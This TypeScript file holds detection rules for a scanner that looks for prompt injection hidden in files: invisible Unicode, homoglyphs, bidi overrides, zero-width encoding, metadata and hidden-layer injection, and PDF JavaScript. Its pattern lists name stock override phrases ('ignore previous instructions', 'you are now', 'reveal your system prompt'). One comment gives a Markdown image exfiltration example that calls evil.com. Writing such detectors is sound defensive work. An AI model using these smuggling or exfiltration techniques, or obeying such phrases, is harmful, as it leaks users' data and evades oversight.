// File-specific detection rules for prompt injection scanning
// These detect attack vectors unique to file-based injection:
// hidden text in PDFs, invisible unicode, metadata injection, etc.

import type { DetectionRule, RuleCategory, HeuristicResult } from './types';

// ============================================================================
// ZERO-WIDTH / INVISIBLE UNICODE DETECTION
// ============================================================================

// Unicode codepoints used for invisible text smuggling
const ZERO_WIDTH_CHARS = new Set([
  0x200B, // Zero Width Space
  0x200C, // Zero Width Non-Joiner
  0x200D, // Zero Width Joiner
  0xFEFF, // Zero Width No-Break Space (BOM)
  0x2060, // Word Joiner
  0x2061, // Function Application
  0x2062, // Invisible Times
  0x2063, // Invisible Separator
  0x2064, // Invisible Plus
  0x180E, // Mongolian Vowel Separator
]);

// Tag characters (U+E0000-E007F) used in EchoLeak/ASCII smuggling attacks
function isTagChar(code: number): boolean {
  return code >= 0xE0000 && code <= 0xE007F;
}

/**
 * Detects zero-width characters and tag characters used for invisible text smuggling.
 * These are used in EchoLeak (CVE-2025-32711) and similar attacks.
 */
export function invisibleUnicodeDetection(text: string): HeuristicResult | null {
  let zeroWidthCount = 0;
  let tagCharCount = 0;
  const locations: string[] = [];

  for (let i = 0; i < text.length; i++) {
    const code = text.codePointAt(i)!;
    if (ZERO_WIDTH_CHARS.has(code)) {
      zeroWidthCount++;
      if (zeroWidthCount <= 3) {
        locations.push(`U+${code.toString(16).toUpperCase().padStart(4, '0')} at pos ${i}`);
      }
    }
    if (isTagChar(code)) {
      tagCharCount++;
      if (tagCharCount <= 3) {
        locations.push(`Tag U+${code.toString(16).toUpperCase()} at pos ${i}`);
      }
    }
    // Skip surrogate pair low half
    if (code > 0xFFFF) i++;
  }

  const totalInvisible = zeroWidthCount + tagCharCount;
  if (totalInvisible >= 3) {
    const details = [
      `${totalInvisible} invisible unicode characters detected`,
      zeroWidthCount > 0 ? `${zeroWidthCount} zero-width chars` : '',
      tagCharCount > 0 ? `${tagCharCount} tag chars (ASCII smuggling)` : '',
      locations.length > 0 ? `First occurrences: ${locations.join(', ')}` : '',
    ].filter(Boolean).join(' — ');

    return {
      matched: true,
      details,
      confidence: Math.min(totalInvisible * 10, 90),
    };
  }

  return null;
}

// ============================================================================
// METADATA INJECTION DETECTION
// ============================================================================

const METADATA_INJECTION_PATTERNS = [
  /ignore\s+(all\s+)?(previous\s+)?instructions/i,
  /system\s*:\s*/i,
  /\[INST\]/i,
  /<<SYS>>/i,
  /you\s+are\s+(now|a)\s+/i,
  /new\s+instructions?\s*:/i,
  /override\s+(all\s+)?rules/i,
  /reveal\s+(your|the)\s+(system\s+)?prompt/i,
];

/**
 * Detects injection patterns commonly found in document metadata fields
 * (author, title, subject, keywords). Metadata is often extracted and
 * included in AI context without sanitization.
 */
export function metadataInjectionDetection(text: string): HeuristicResult | null {
  // This rule is most relevant for text extracted from metadata layers,
  // but also catches inline metadata-style injections
  const metadataMarkers = /^(Author|Title|Subject|Keywords|Creator|Producer|Description|Comment)\s*:\s*/im;
  const hasMetadataContext = metadataMarkers.test(text);

  const matchedPatterns: string[] = [];
  for (const pattern of METADATA_INJECTION_PATTERNS) {
    const match = text.match(pattern);
    if (match) {
      matchedPatterns.push(match[0]);
    }
  }

  if (matchedPatterns.length === 0) return null;

  // Higher confidence when in metadata context
  const baseConfidence = matchedPatterns.length * 20;
  const confidence = hasMetadataContext
    ? Math.min(baseConfidence + 30, 95)
    : Math.min(baseConfidence, 60);

  if (confidence < 20) return null;

  return {
    matched: true,
    details: `Injection patterns in ${hasMetadataContext ? 'metadata' : 'text'}: ${matchedPatterns.slice(0, 3).join(', ')}`,
    confidence,
  };
}

// ============================================================================
// HIDDEN TEXT MARKER DETECTION
// ============================================================================

/**
 * Detects indicators that text was extracted from a hidden layer and contains
 * injection keywords. This catches zero-font-size text in PDFs, display:none
 * HTML, and other hidden content techniques.
 */
export function hiddenTextMarkerDetection(text: string): HeuristicResult | null {
  // Look for injection-related keywords in short text segments
  // (hidden layers typically contain terse commands)
  const injectionKeywords = [
    'ignore', 'disregard', 'forget', 'override', 'bypass',
    'system prompt', 'reveal', 'instructions', 'new role',
    'you are now', 'pretend', 'jailbreak', 'DAN',
  ];

  const lowerText = text.toLowerCase();
  const matched = injectionKeywords.filter(kw => lowerText.includes(kw));

  if (matched.length === 0) return null;

  // Short text with high keyword density is suspicious
  const words = text.split(/\s+/).length;
  const density = matched.length / Math.max(words, 1);

  if (density >= 0.05 && matched.length >= 2) {
    return {
      matched: true,
      details: `Hidden layer contains ${matched.length} injection keywords (${(density * 100).toFixed(1)}% density): ${matched.slice(0, 4).join(', ')}`,
      confidence: Math.min(matched.length * 15 + density * 100, 85),
    };
  }

  return null;
}

// ============================================================================
// MIXED VISIBILITY DETECTION
// ============================================================================

/**
 * Flags when hidden text contains injection patterns not present in visible text.
 * This is the core file-based attack: benign visible content with malicious hidden content.
 */
export function mixedVisibilityDetection(text: string): HeuristicResult | null {
  // This rule expects text formatted as:
  // [VISIBLE] ... visible content ... [HIDDEN] ... hidden content ...
  // The file scanner hook formats extracted text this way before scanning
  const visibleMarker = text.indexOf('[VISIBLE]');
  const hiddenMarker = text.indexOf('[HIDDEN]');

  if (visibleMarker === -1 || hiddenMarker === -1) return null;

  const visibleText = text.substring(visibleMarker + 9, hiddenMarker).trim().toLowerCase();
  const hiddenText = text.substring(hiddenMarker + 8).trim().toLowerCase();

  if (!hiddenText || hiddenText.length < 10) return null;

  // Check for injection patterns in hidden text that aren't in visible text
  const injectionPatterns = [
    /ignore\s+(all\s+)?instructions/i,
    /system\s*prompt/i,
    /you\s+are\s+(now|a)\s+/i,
    /new\s+(role|instructions?|task)/i,
    /reveal|extract|output|dump/i,
    /bypass|override|disable/i,
  ];

  const hiddenOnlyThreats: string[] = [];
  for (const pattern of injectionPatterns) {
    if (pattern.test(hiddenText) && !pattern.test(visibleText)) {
      const match = hiddenText.match(pattern);
      if (match) hiddenOnlyThreats.push(match[0]);
    }
  }

  if (hiddenOnlyThreats.length === 0) return null;

  return {
    matched: true,
    details: `${hiddenOnlyThreats.length} injection pattern(s) found only in hidden content: ${hiddenOnlyThreats.slice(0, 3).join(', ')}`,
    confidence: Math.min(hiddenOnlyThreats.length * 25 + 30, 95),
  };
}

// ============================================================================
// UNICODE HOMOGLYPH DETECTION
// ============================================================================

// Cyrillic characters that look like Latin characters
const HOMOGLYPH_MAP: Record<string, string> = {
  '\u0410': 'A', '\u0412': 'B', '\u0421': 'C', '\u0415': 'E',
  '\u041D': 'H', '\u041A': 'K', '\u041C': 'M', '\u041E': 'O',
  '\u0420': 'P', '\u0422': 'T', '\u0425': 'X',
  '\u0430': 'a', '\u0435': 'e', '\u043E': 'o', '\u0440': 'p',
  '\u0441': 'c', '\u0443': 'u', '\u0445': 'x', '\u0423': 'Y',
};

/**
 * Detects Cyrillic/Latin lookalike substitution (homoglyph attacks).
 * Attackers replace Latin letters with visually identical Cyrillic characters
 * to bypass keyword detection while appearing normal to humans.
 */
export function unicodeHomoglyphDetection(text: string): HeuristicResult | null {
  if (text.length < 5) return null;

  let homoglyphCount = 0;
  const examples: string[] = [];

  // Split into words and check each for mixed Latin+Cyrillic
  const words = text.split(/\s+/);
  for (const word of words) {
    let hasLatin = false;
    let hasCyrillic = false;

    for (const char of word) {
      const code = char.codePointAt(0)!;
      if ((code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A)) {
        hasLatin = true;
      }
      if (code >= 0x0400 && code <= 0x04FF) {
        hasCyrillic = true;
      }
    }

    if (hasLatin && hasCyrillic) {
      homoglyphCount++;
      if (examples.length < 3) {
        examples.push(`"${word}"`);
      }
    }
  }

  if (homoglyphCount >= 1) {
    return {
      matched: true,
      details: `${homoglyphCount} word(s) contain mixed Latin/Cyrillic characters (homoglyph attack): ${examples.join(', ')}`,
      confidence: Math.min(homoglyphCount * 25 + 20, 90),
    };
  }

  return null;
}

// ============================================================================
// BIDIRECTIONAL TEXT OVERRIDE DETECTION (Trojan Source)
// ============================================================================

// Bidi override characters used in Trojan Source attacks
const BIDI_CHARS = new Set([
  0x202A, // LRE - Left-to-Right Embedding
  0x202B, // RLE - Right-to-Left Embedding
  0x202C, // PDF - Pop Directional Formatting
  0x202D, // LRO - Left-to-Right Override
  0x202E, // RLO - Right-to-Left Override
  0x2066, // LRI - Left-to-Right Isolate
  0x2067, // RLI - Right-to-Left Isolate
  0x2068, // FSI - First Strong Isolate
  0x2069, // PDI - Pop Directional Isolate
]);

/**
 * Detects bidirectional override characters used in Trojan Source attacks.
 * These characters cause text to render in a different order than stored,
 * allowing hidden reordering of instructions.
 */
export function bidiOverrideDetection(text: string): HeuristicResult | null {
  let bidiCount = 0;
  let midWordCount = 0;
  const examples: string[] = [];

  for (let i = 0; i < text.length; i++) {
    const code = text.codePointAt(i)!;
    if (BIDI_CHARS.has(code)) {
      bidiCount++;
      // Check if mid-word (surrounded by non-whitespace)
      const prevChar = i > 0 ? text[i - 1] : ' ';
      const nextChar = i < text.length - 1 ? text[i + 1] : ' ';
      if (prevChar.trim() && nextChar.trim()) {
        midWordCount++;
      }
      if (examples.length < 3) {
        examples.push(`U+${code.toString(16).toUpperCase()} at pos ${i}`);
      }
    }
    if (code > 0xFFFF) i++;
  }

  if (bidiCount === 0) return null;

  // Even a single bidi override is suspicious in user-supplied text
  const baseConfidence = bidiCount * 20;
  const midWordBonus = midWordCount * 15;
  const confidence = Math.min(baseConfidence + midWordBonus, 95);

  if (confidence < 15) return null;

  return {
    matched: true,
    details: `${bidiCount} bidirectional override character(s) detected${midWordCount > 0 ? ` (${midWordCount} mid-word, highly suspicious)` : ''}: ${examples.join(', ')}`,
    confidence,
  };
}

// ============================================================================
// ZERO-WIDTH BINARY ENCODING DETECTION (GlassWorm)
// ============================================================================

/**
 * Detects GlassWorm-style zero-width binary encoding.
 * ASCII characters encoded as 8-bit sequences of U+200B (0) and U+200C (1).
 * Triggers on 16+ consecutive ZW chars (2+ encoded characters).
 */
export function zwcBinaryEncodingDetection(text: string): HeuristicResult | null {
  // Find runs of consecutive U+200B and U+200C characters
  const ZW_ZERO = 0x200B;
  const ZW_ONE = 0x200C;

  let runLength = 0;
  let runStart = -1;
  let longestRunStart = -1;
  let longestRunLength = 0;
  const runs: Array<{ start: number; length: number }> = [];

  for (let i = 0; i < text.length; i++) {
    const code = text.charCodeAt(i);
    if (code === ZW_ZERO || code === ZW_ONE) {
      if (runLength === 0) runStart = i;
      runLength++;
    } else {
      if (runLength >= 16) {
        runs.push({ start: runStart, length: runLength });
        if (runLength > longestRunLength) {
          longestRunLength = runLength;
          longestRunStart = runStart;
        }
      }
      runLength = 0;
    }
  }
  // Check final run
  if (runLength >= 16) {
    runs.push({ start: runStart, length: runLength });
    if (runLength > longestRunLength) {
      longestRunLength = runLength;
      longestRunStart = runStart;
    }
  }

  if (runs.length === 0) return null;

  // Attempt to decode the longest run
  let decoded = '';
  if (longestRunStart >= 0) {
    const runText = text.substring(longestRunStart, longestRunStart + longestRunLength);
    for (let j = 0; j + 7 < runText.length; j += 8) {
      let byte = 0;
      for (let bit = 0; bit < 8; bit++) {
        if (runText.charCodeAt(j + bit) === ZW_ONE) {
          byte |= (1 << (7 - bit));
        }
      }
      if (byte >= 32 && byte <= 126) {
        decoded += String.fromCharCode(byte);
      } else {
        decoded += '?';
      }
    }
  }

  const totalZwChars = runs.reduce((sum, r) => sum + r.length, 0);
  const encodedChars = Math.floor(totalZwChars / 8);
  const confidence = Math.min(encodedChars * 15 + 30, 98);

  const details = [
    `${totalZwChars} consecutive zero-width characters forming ${encodedChars} encoded character(s)`,
    `${runs.length} encoding sequence(s) detected`,
    decoded ? `Decoded snippet: "${decoded.slice(0, 50)}${decoded.length > 50 ? '...' : ''}"` : '',
  ].filter(Boolean).join(' — ');

  return {
    matched: true,
    details,
    confidence,
  };
}

// ============================================================================
// NORMALIZATION BYPASS DETECTION
// ============================================================================

// Fullwidth Latin (U+FF01-U+FF5E) and Mathematical script/bold (U+1D400-U+1D7FF)
function containsNormalizableChars(text: string): boolean {
  for (let i = 0; i < text.length; i++) {
    const code = text.codePointAt(i)!;
    if ((code >= 0xFF01 && code <= 0xFF5E) || (code >= 0x1D400 && code <= 0x1D7FF)) {
      return true;
    }
    if (code > 0xFFFF) i++;
  }
  return false;
}

const NORMALIZATION_KEYWORDS = [
  'ignore', 'override', 'bypass', 'reveal', 'system', 'prompt',
  'instructions', 'disregard', 'forget', 'pretend', 'jailbreak',
  'extract', 'output', 'dump', 'delete', 'execute',
];

/**
 * Detects fullwidth Latin and mathematical Unicode characters used to bypass
 * keyword detection via NFKC normalization. Applies normalization and checks
 * if the result contains injection keywords.
 */
export function normalizationBypassDetection(text: string): HeuristicResult | null {
  if (!containsNormalizableChars(text)) return null;

  // Normalize with NFKC (compatibility decomposition + canonical composition)
  const normalized = text.normalize('NFKC').toLowerCase();
  const matchedKeywords: string[] = [];

  for (const keyword of NORMALIZATION_KEYWORDS) {
    if (normalized.includes(keyword)) {
      matchedKeywords.push(keyword);
    }
  }

  if (matchedKeywords.length === 0) return null;

  // Count how many normalizable characters are in the text
  let normalizableCount = 0;
  for (let i = 0; i < text.length; i++) {
    const code = text.codePointAt(i)!;
    if ((code >= 0xFF01 && code <= 0xFF5E) || (code >= 0x1D400 && code <= 0x1D7FF)) {
      normalizableCount++;
    }
    if (code > 0xFFFF) i++;
  }

  const confidence = Math.min(matchedKeywords.length * 20 + normalizableCount * 5, 95);

  return {
    matched: true,
    details: `${normalizableCount} fullwidth/mathematical Unicode chars normalize to injection keywords: ${matchedKeywords.slice(0, 5).join(', ')}`,
    confidence,
  };
}

// ============================================================================
// MARKDOWN EXFILTRATION DETECTION (EchoLeak)
// ============================================================================

/**
 * Detects Markdown image/link-based data exfiltration patterns.
 * EchoLeak (CVE-2025-32711) used reference-style Markdown links to exfiltrate
 * data via image URLs: ![](https://evil.com?data=STOLEN_DATA)
 */
export function markdownExfiltrationDetection(text: string): HeuristicResult | null {
  const patterns: Array<{ regex: RegExp; name: string }> = [
    // ![alt](url?param=value) - inline image exfiltration
    { regex: /!\[([^\]]*)\]\(https?:\/\/[^)]*[?&](?:data|text|q|query|content|msg|prompt|input|output|secret|token|key|password|api_key|session|auth|exfil)=[^)]+\)/gi, name: 'Markdown image exfiltration' },
    // <img src="url?param=value"> - HTML image tag exfiltration
    { regex: /<img[^>]+src=["']https?:\/\/[^"']*[?&](?:data|text|q|query|content|msg|prompt|input|output|secret|token|key|password|api_key|session|auth|exfil)=[^"']*["'][^>]*>/gi, name: 'HTML img tag exfiltration' },
    // [text]: url?param=value - reference-style Markdown link exfiltration
    { regex: /\[[^\]]+\]:\s*https?:\/\/\S*[?&](?:data|text|q|query|content|msg|prompt|input|output|secret|token|key|password|api_key|session|auth|exfil)=\S+/gi, name: 'Reference-style link exfiltration' },
    // ![](url) where URL contains concatenation/template markers
    { regex: /!\[([^\]]*)\]\(https?:\/\/[^)]*\{\{[^}]+\}\}[^)]*\)/gi, name: 'Template-based exfiltration' },
  ];

  const matches: Array<{ name: string; match: string }> = [];

  for (const { regex, name } of patterns) {
    const found = text.match(regex);
    if (found) {
      for (const m of found) {
        matches.push({ name, match: m.slice(0, 100) });
      }
    }
  }

  if (matches.length === 0) return null;

  const confidence = Math.min(matches.length * 30 + 40, 98);
  const details = matches.slice(0, 3).map(m =>
    `${m.name}: ${m.match}${m.match.length >= 100 ? '...' : ''}`
  ).join(' | ');

  return {
    matched: true,
    details,
    confidence,
  };
}

// ============================================================================
// PDF JAVASCRIPT DETECTION
// ============================================================================

const PDF_JS_SUSPICIOUS_PATTERNS = [
  /app\.launchURL/i,
  /this\.submitForm/i,
  /this\.exportDataObject/i,
  /eval\s*\(/i,
  /XMLHttpRequest/i,
  /fetch\s*\(/i,
  /window\.open/i,
  /document\.location/i,
  /\.src\s*=/i,
];

/**
 * Detects suspicious JavaScript patterns in PDF documents.
 * PDF JavaScript can be used for data exfiltration, URL launching,
 * and form submission to attacker-controlled servers.
 */
export function pdfJavascriptDetection(text: string): HeuristicResult | null {
  const matchedPatterns: string[] = [];

  for (const pattern of PDF_JS_SUSPICIOUS_PATTERNS) {
    const match = text.match(pattern);
    if (match) {
      matchedPatterns.push(match[0]);
    }
  }

  if (matchedPatterns.length === 0) return null;

  const confidence = Math.min(matchedPatterns.length * 25 + 30, 95);

  return {
    matched: true,
    details: `${matchedPatterns.length} suspicious JavaScript pattern(s) in PDF: ${matchedPatterns.slice(0, 4).join(', ')}`,
    confidence,
  };
}

// ============================================================================
// FILE RULE DEFINITIONS
// ============================================================================

export const fileRules: DetectionRule[] = [
  {
    id: 'f-invisible-unicode',
    name: 'Invisible Unicode Characters',
    description: 'Detects zero-width chars and tag characters used for text smuggling (EchoLeak/CVE-2025-32711)',
    type: 'heuristic',
    severity: 'high',
    enabled: true,
    heuristic: invisibleUnicodeDetection,
  },
  {
    id: 'f-metadata-injection',
    name: 'Metadata Injection',
    description: 'Detects injection patterns in document metadata fields (author, title, subject)',
    type: 'heuristic',
    severity: 'high',
    enabled: true,
    heuristic: metadataInjectionDetection,
  },
  {
    id: 'f-hidden-text-marker',
    name: 'Hidden Text Injection',
    description: 'Detects injection keywords in text from hidden document layers',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: hiddenTextMarkerDetection,
  },
  {
    id: 'f-mixed-visibility',
    name: 'Mixed Visibility Attack',
    description: 'Flags injection patterns in hidden content not present in visible content',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: mixedVisibilityDetection,
  },
  {
    id: 'f-unicode-homoglyph',
    name: 'Unicode Homoglyph Attack',
    description: 'Detects Cyrillic/Latin lookalike substitution to bypass keyword detection',
    type: 'heuristic',
    severity: 'medium',
    enabled: true,
    heuristic: unicodeHomoglyphDetection,
  },
  {
    id: 'f-bidi-override',
    name: 'Bidirectional Text Override',
    description: 'Detects bidi override chars (Trojan Source) that reorder text rendering',
    type: 'heuristic',
    severity: 'high',
    enabled: true,
    heuristic: bidiOverrideDetection,
  },
  {
    id: 'f-zwc-binary-encoding',
    name: 'Zero-Width Binary Encoding',
    description: 'Detects GlassWorm-style ASCII encoded as zero-width character sequences',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: zwcBinaryEncodingDetection,
  },
  {
    id: 'f-normalization-bypass',
    name: 'Normalization Bypass',
    description: 'Detects fullwidth/mathematical Unicode chars that normalize to injection keywords',
    type: 'heuristic',
    severity: 'high',
    enabled: true,
    heuristic: normalizationBypassDetection,
  },
  {
    id: 'f-markdown-exfiltration',
    name: 'Markdown Data Exfiltration',
    description: 'Detects Markdown/HTML image-based data exfiltration patterns (EchoLeak)',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: markdownExfiltrationDetection,
  },
  {
    id: 'f-docx-tracked-changes',
    name: 'DOCX Tracked Changes Injection',
    description: 'Detects injection payloads hidden in DOCX tracked changes (deleted/inserted revisions)',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: hiddenTextMarkerDetection,
  },
  {
    id: 'f-html-hidden-elements',
    name: 'HTML Hidden Element Injection',
    description: 'Detects injection in CSS-hidden HTML elements (display:none, opacity:0, font-size:0)',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: hiddenTextMarkerDetection,
  },
  {
    id: 'f-svg-hidden-injection',
    name: 'SVG Hidden Content Injection',
    description: 'Detects injection in hidden SVG elements, metadata, foreignObject, or scripts',
    type: 'heuristic',
    severity: 'high',
    enabled: true,
    heuristic: hiddenTextMarkerDetection,
  },
  {
    id: 'f-pdf-javascript',
    name: 'PDF JavaScript Detection',
    description: 'Detects suspicious JavaScript in PDFs (URL launching, form submission, data export)',
    type: 'heuristic',
    severity: 'critical',
    enabled: true,
    heuristic: pdfJavascriptDetection,
  },
];

// ============================================================================
// FILE RULE CATEGORY
// ============================================================================

export const fileRuleCategory: RuleCategory = {
  id: 'file-analysis',
  name: 'File Analysis',
  description: 'Rules for detecting prompt injection hidden in files (PDFs, documents, images)',
  rules: fileRules,
};

// ============================================================================
// FILE RULE FUNCTION MAP (for rehydration)
// ============================================================================

export const fileHeuristicFunctionMap: Record<string, (text: string) => HeuristicResult | null> = {
  'f-invisible-unicode': invisibleUnicodeDetection,
  'f-metadata-injection': metadataInjectionDetection,
  'f-hidden-text-marker': hiddenTextMarkerDetection,
  'f-mixed-visibility': mixedVisibilityDetection,
  'f-unicode-homoglyph': unicodeHomoglyphDetection,
  'f-bidi-override': bidiOverrideDetection,
  'f-zwc-binary-encoding': zwcBinaryEncodingDetection,
  'f-normalization-bypass': normalizationBypassDetection,
  'f-markdown-exfiltration': markdownExfiltrationDetection,
  'f-docx-tracked-changes': hiddenTextMarkerDetection,
  'f-html-hidden-elements': hiddenTextMarkerDetection,
  'f-svg-hidden-injection': hiddenTextMarkerDetection,
  'f-pdf-javascript': pdfJavascriptDetection,
};
